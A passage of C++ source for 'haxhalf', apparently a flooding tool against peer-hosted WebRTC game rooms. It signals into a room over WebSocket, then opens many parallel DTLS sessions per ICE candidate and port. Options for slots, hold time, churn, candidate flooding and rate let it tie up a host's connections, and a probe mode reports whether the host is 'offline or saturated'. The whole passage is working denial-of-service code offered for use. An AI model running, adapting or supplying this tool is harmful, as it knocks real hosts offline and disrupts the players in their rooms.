    if ((v >> 16) == 0xC0A8) return true;
    if ((v >> 16) == 0xA9FE) return true;
    return false;
}

static void parseCandidates(const std::string& txt, std::vector<Host>& out) {
    size_t p = 0;
    while ((p = txt.find("candidate:")) != std::string::npos) {
        p += 10;
        size_t e = txt.find_first_of("\"\r\n", p);
        std::string line = txt.substr(p, e == std::string::npos ? std::string::npos : e - p);
        std::vector<std::string> t; std::string cur;
        for (char c : line) {
            if (c == ' ' || c == '\t') { if (!cur.empty()) { t.push_back(cur); cur.clear(); } }
            else cur += c;
        }
        if (!cur.empty()) t.push_back(cur);
        if (t.size() >= 8 && ieq(t[2], "udp") && ieq(t[6], "typ")) {
            int port = atoi(t[5].c_str());
            in_addr a{};

            if (port > 0 && port < 65536 && inet_pton(AF_INET, t[4].c_str(), &a) == 1) {
                int rank = 4;
                if      (ieq(t[7], "srflx")) rank = 0;
                else if (ieq(t[7], "relay")) rank = 1;
                else if (ieq(t[7], "prflx")) rank = 2;
                else if (ieq(t[7], "host"))  rank = isPrivate(t[4]) ? 3 : 1;
                out.push_back({t[4], port, rank, atoi(t[3].c_str())});
            }
        }
        p = (e == std::string::npos) ? txt.size() : e;
    }
    std::stable_sort(out.begin(), out.end(), [](const Host& a, const Host& b) {
        if (a.rank != b.rank) return a.rank < b.rank;
        return a.prio > b.prio;
    });
}

static std::string field(const std::string& s, const char* key) {
    size_t p = s.find(key);
    if (p == std::string::npos) return "";
    p += strlen(key);
    size_t e = s.find_first_of("\r\n", p);
    return s.substr(p, e - p);
}

static std::vector<uint8_t> buildOffer(const std::string& ufrag, const std::string& pwd) {
    if (!OFFER_HEX.empty()) return unhex(OFFER_HEX);

    std::vector<uint8_t> body;
    body.push_back(0);
    putStr(body, makeSdp(ufrag, pwd));
    if (JOIN) putStr(body, "{\"name\":\"" + NICK + "\",\"avatar\":\"" + AVATAR +
                          "\",\"country\":\"" + COUNTRY + "\"}");
    else      putStr(body, "[]");
    putBE16(body, (uint16_t)VERSION);
    putPwd(body, PASSWORD);

    auto payload = deflateRaw(body);
    std::vector<uint8_t> f;
    f.push_back(T_OFFER);
    f.insert(f.end(), payload.begin(), payload.end());
    dbg("tx offer %zu bytes (body %zu)", f.size(), body.size());
    dumpFile("/tmp/haxhalf_last_tx.hex", fullHex(f));
    return f;
}

struct Join {
    Ws ws;
    std::vector<Host> hosts;
    std::string lu, lp, ru, rp;
    bool asClient = true;
};

static int parseAnswer(const std::vector<uint8_t>& pl, std::string& sdp, std::string& cands) {
    if (pl.empty()) return 0;
    if (pl[0] == R_CAND) {
        std::string inf;
        if (inflateRaw(pl.data() + 1, pl.size() - 1, inf)) cands += inf;
        else cands.append((char*)pl.data() + 1, pl.size() - 1);
        return 0;
    }
    if (pl[0] != R_ANSWER) {
        for (size_t i = 0; i + 1 < pl.size(); i++) {
            unsigned c = ((unsigned)pl[i] << 8) | pl[i + 1];
            if (c >= 4100 && c <= 4105) { g_reject++; return (int)c; }
        }
        return 0;
    }
    std::string inf;
    if (!inflateRaw(pl.data() + 1, pl.size() - 1, inf))
        inf.assign((char*)pl.data() + 1, pl.size() - 1);

    size_t off = 0; uint32_t len = 0;
    if (!getVarint((const uint8_t*)inf.data(), inf.size(), off, len) || off + len > inf.size())
        return 0;
    sdp = inf.substr(off, len);
    if (sdp.compare(0, 3, "v=0") != 0) {
        for (size_t i = 0; i + 1 < inf.size(); i++) {
            unsigned c = ((unsigned)(uint8_t)inf[i] << 8) | (uint8_t)inf[i + 1];
            if (c >= 4100 && c <= 4105) { g_reject++; return (int)c; }
        }
        return 0;
    }
    off += len;
    uint32_t clen = 0;
    if (getVarint((const uint8_t*)inf.data(), inf.size(), off, clen) && off + clen <= inf.size())
        cands.append(inf, off, clen);
    return 1;
}

static bool doSignal(Join& j) {
    uint8_t uf[4], pw[16]; RAND_bytes(uf, 4); RAND_bytes(pw, 16);
    auto b64 = [](const uint8_t* d, size_t n) {
        std::string s(4 * ((n + 2) / 3) + 1, 0);
        int l = EVP_EncodeBlock((unsigned char*)s.data(), d, (int)n);
        s.resize(l); return s;
    };
    j.lu = b64(uf, 4);
    j.lp = b64(pw, 16);

    std::string path = "/client?id=" + ROOM + (TOKEN.empty() ? "" : "&token=" + TOKEN);
    if (!j.ws.open(path)) { g_sig_bad++; return false; }

    auto frame = buildOffer(j.lu, j.lp);
    if (!j.ws.sendBinary(frame)) { j.ws.close(); g_sig_bad++; return false; }
    j.ws.sendBinary({T_READY});

    std::string sdp, cands;
    auto deadline = Clock::now() + 5s;
    bool got = false;
    while (Clock::now() < deadline && !g_stop) {
        std::vector<uint8_t> pl;
        int op = j.ws.recvFrame(pl);
        if (op < 0) break;
        if (op == 0x8) {
            unsigned code = pl.size() >= 2 ? ((pl[0] << 8) | pl[1]) : 0;
            dbg("ws close %u '%s'", code,
                pl.size() > 2 ? std::string((char*)pl.data() + 2, pl.size() - 2).c_str() : "");
            break;
        }
        if (pl.empty()) continue;
        dumpFile("/tmp/haxhalf_last_rx.hex", fullHex(pl));
        dbg("rx type %02x len %zu: %s", pl[0], pl.size(), hexDump(pl, 32).c_str());
        int r = parseAnswer(pl, sdp, cands);
        if (r > 0) {
            if (r == 1) { got = true; break; }
            logline("reject %d (%s)", r, codeName(r));
            break;
        }
    }
    if (!got) { g_sig_bad++; j.ws.close(); return false; }

    parseCandidates(sdp, j.hosts);
    parseCandidates(cands, j.hosts);
    if (j.hosts.empty()) { g_sig_bad++; j.ws.close(); return false; }
    if (j.hosts.size() > (size_t)MAX_CAND) j.hosts.resize(MAX_CAND);

    j.ru = field(sdp, "a=ice-ufrag:");
    j.rp = field(sdp, "a=ice-pwd:");
    if (j.ru.empty() || j.rp.empty()) { g_sig_bad++; j.ws.close(); return false; }
    std::string setup = field(sdp, "a=setup:");
    j.asClient = (setup == "passive");
    if (!SDP_OUT.empty()) dumpFile(SDP_OUT.c_str(), sdp);
    g_sig_ok++;
    dbg("answer: %zu cands, setup=%s -> dtls %s", j.hosts.size(),
        setup.c_str(), j.asClient ? "client" : "server");
    return true;
}

static void runSlot() {
    Join j;
    if (!doSignal(j)) {
        std::this_thread::sleep_for(std::chrono::milliseconds(150 + rand() % 350));
        return;
    }
    if (MODE == "dtls") j.ws.close();

    long long end = nowMs() + HOLD_MS;
    std::vector<Dtls> dts;
    if (MODE != "ws") {
        dts.reserve(j.hosts.size() * PORTS);
        for (auto& h : j.hosts) {
            for (int k = 0; k < PORTS; k++) {
                dts.emplace_back();
                Dtls& d = dts.back();
                d.peer.sin_family = AF_INET;
                d.peer.sin_port = htons(h.port);
                inet_pton(AF_INET, h.ip.c_str(), &d.peer.sin_addr);
                d.cr = {j.lu, j.lp, j.ru, j.rp};
                d.asClient = j.asClient;
                d.begin(j.asClient ? 6000 : 10000);
            }
        }
        g_pending++;
    }

    long long lastPing = 0;
    while (!g_stop && nowMs() < end) {
        long long n = nowMs();
        for (auto& d : dts) {
            if (d.state == D_DEAD) {
                if (n < d.retryAt) continue;
                if (CHURN > 0 && d.cycles >= CHURN) continue;
                d.begin(d.asClient ? 6000 : 10000);
            }
            d.step(n, d.asClient ? 6000 : 10000);
        }
        if (j.ws.fd >= 0 && n - lastPing >= PING_MS) {
            lastPing = n;
            j.ws.poll();
            j.ws.sendBinary({T_PING});
        }
        std::this_thread::sleep_for(4ms);
    }
    if (MODE != "ws") g_pending--;
    for (auto& d : dts) d.closeAll();
    j.ws.close();
}

static void worker() {
    while (!g_stop) {
        if (g_stop) break;
        runSlot();
        if (COUNT > 0 && g_sig_ok.load() + g_sig_bad.load() >= COUNT) break;
    }
}

int main(int argc, char** argv) {
    crc32cInit();

    for (int i = 1; i < argc; i++) {
        std::string a = argv[i];
        auto nx = [&] { return (i + 1 < argc) ? std::string(argv[++i]) : std::string(); };
        if      (a == "--room")       ROOM = nx();
        else if (a == "--host")       MANUAL_HOST = nx();
        else if (a == "--slots")      SLOTS = atoi(nx().c_str());
        else if (a == "--hold")       HOLD_MS = atoi(nx().c_str());
        else if (a == "--count")      COUNT = atol(nx().c_str());
        else if (a == "--mode")       MODE = nx();
        else if (a == "--ports")      PORTS = std::max(1, atoi(nx().c_str()));
        else if (a == "--max-cand")   MAX_CAND = std::max(1, atoi(nx().c_str()));
        else if (a == "--cand-flood") CAND_FLOOD = std::max(0, atoi(nx().c_str()));
        else if (a == "--churn")      CHURN = atoi(nx().c_str());
        else if (a == "--ping")       PING_MS = std::max(100, atoi(nx().c_str()));
        else if (a == "--keepalive")  KA_MS = std::max(500, atoi(nx().c_str()));
        else if (a == "--rate")       RATE = std::max(1, atoi(nx().c_str()));
        else if (a == "--burst")      BURST = atoi(nx().c_str());
        else if (a == "--token")      TOKEN = nx();
        else if (a == "--password")   PASSWORD = nx();
        else if (a == "--version")    VERSION = atoi(nx().c_str());
        else if (a == "--ttl")        TTL = atoi(nx().c_str());
        else if (a == "--offer-hex")  OFFER_HEX = nx();
        else if (a == "--join")       JOIN = true;
        else if (a == "--nick")       NICK = nx();
        else if (a == "--avatar")     AVATAR = nx();
        else if (a == "--country")    COUNTRY = nx();
        else if (a == "--real-cand")  REAL_CAND = nx();
        else if (a == "--ping-op")    PING_OP = atoi(nx().c_str());
        else if (a == "--pong-hex")   PONG_HEX = nx();
        else if (a == "--once")       ONCE = true;
        else if (a == "--probe")      PROBE = true;
        else if (a == "--sdp-out")    SDP_OUT = nx();
        else if (a == "--debug")      g_debug = true;
        else if (a == "--quiet")      QUIET = true;
        else {
            printf("haxhalf [--room ID] [--slots N] [--hold MS] [--count N]\n"
                   "        [--mode ws|full|dtls] [--ports N] [--max-cand N]\n"
                   "        [--cand-flood N] [--churn N] [--ping MS] [--keepalive MS]\n"
                   "        [--rate N] [--burst N] [--token T] [--password P]\n"
                   "        [--version N] [--offer-hex H] [--real-cand ip:port]\n"
                   "        [--join] [--nick S] [--avatar S] [--country CC]\n"
                   "        [--ping-op N] [--pong-hex H]\n"
                   "        [--once] [--probe] [--sdp-out F] [--debug] [--quiet]\n");
            return 1;
        }
    }
    if (ONCE) { SLOTS = 1; COUNT = 1; }
    if (PROBE) { SLOTS = 1; COUNT = 1; QUIET = true; HOLD_MS = 3000; CAND_FLOOD = 8; }
    if (!PONG_HEX.empty()) g_pong = unhex(PONG_HEX);
    g_pacer.start(RATE, BURST);

    signal(SIGPIPE, SIG_IGN);
    signal(SIGINT, [](int) { g_stop = true; });
    signal(SIGTERM, [](int) { g_stop = true; });
    SSL_library_init(); SSL_load_error_strings();
    makeCert();

    g_dtls = SSL_CTX_new(DTLS_method());
    SSL_CTX_set_min_proto_version(g_dtls, DTLS1_2_VERSION);
    SSL_CTX_set_max_proto_version(g_dtls, DTLS1_2_VERSION);
    SSL_CTX_set_cipher_list(g_dtls, "ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256");
    SSL_CTX_set_tlsext_use_srtp(g_dtls, "SRTP_AES128_CM_SHA1_80:SRTP_AEAD_AES_128_GCM");
    SSL_CTX_use_certificate(g_dtls, g_cert);
    SSL_CTX_use_PrivateKey(g_dtls, g_key);
    SSL_CTX_set_verify(g_dtls, SSL_VERIFY_NONE, nullptr);

    if (!MANUAL_HOST.empty()) {
        auto c = MANUAL_HOST.find(':');
        if (c == std::string::npos) { printf("--host wants ip:port\n"); return 1; }
        sockaddr_in h{};
        h.sin_family = AF_INET;
        h.sin_port = htons(atoi(MANUAL_HOST.c_str() + c + 1));
        inet_pton(AF_INET, MANUAL_HOST.substr(0, c).c_str(), &h.sin_addr);
        logline("manual %s | %d sockets", MANUAL_HOST.c_str(), SLOTS);
        std::vector<Dtls> dts(SLOTS);
        for (auto& d : dts) {
            d.peer = h; d.asClient = true;
            d.cr = {"aaaa", "bbbbbbbbbbbbbbbbbbbbbbbb", "cccc", "dddddddddddddddddddddddd"};
            d.begin(8000);
        }
        while (!g_stop) {
            long long n = nowMs();
            for (auto& d : dts) {
                if (d.state == D_DEAD) {
                    if (n < d.retryAt) continue;
                    d.begin(8000);
                }
                d.step(n, 8000);
            }
            std::this_thread::sleep_for(4ms);
        }
        for (auto& d : dts) d.closeAll();
        return 0;
    }

    logline("room %s | mode %s%s | slots %d | hold %dms | ports %d | cands %d+%d flood | "
            "rate %d/s | ver %d",
            ROOM.c_str(), MODE.c_str(), JOIN ? " +join" : "", SLOTS, HOLD_MS, PORTS,
            MAX_CAND, CAND_FLOOD, RATE, VERSION);

    std::vector<std::thread> th;
    for (int i = 0; i < SLOTS; i++) th.emplace_back(worker);

    while (!g_stop) {
        std::this_thread::sleep_for(5s);
        if (QUIET) continue;
        logline("slots %ld/%ld | 429 %ld 503 %ld reject %ld | hs %ld/%ld churn %ld | "
                "held %d dtls %d open %ld joined %ld stun %ld | tx %ld rx %ld | penalty %llds",
                g_sig_ok.load(), g_sig_ok.load() + g_sig_bad.load(), g_429.load(), g_503.load(),
                g_reject.load(), g_hs_ok.load(), g_hs_ok.load() + g_hs_bad.load(), g_churn.load(),
                g_pending.load(), g_live.load(), g_open.load(), g_joined.load(),
                g_stun_ok.load(), g_tx.load(), g_rx.load(),
                std::max(0LL, (g_penaltyUntil.load() - nowMs()) / 1000));
        if (COUNT > 0 && g_sig_ok.load() + g_sig_bad.load() >= COUNT) g_stop = true;
    }
    for (auto& t : th) t.join();

    if (PROBE) {
        if (g_sig_ok.load())   logline("PROBE: host ALIVE (signaled ok)");
        else if (g_429.load()) logline("PROBE: rate limited — wait a minute, then retry");
        else if (g_503.load()) logline("PROBE: 503 on every attempt — host offline or saturated");
        else                   logline("PROBE: inconclusive");
    }
    return 0;
}
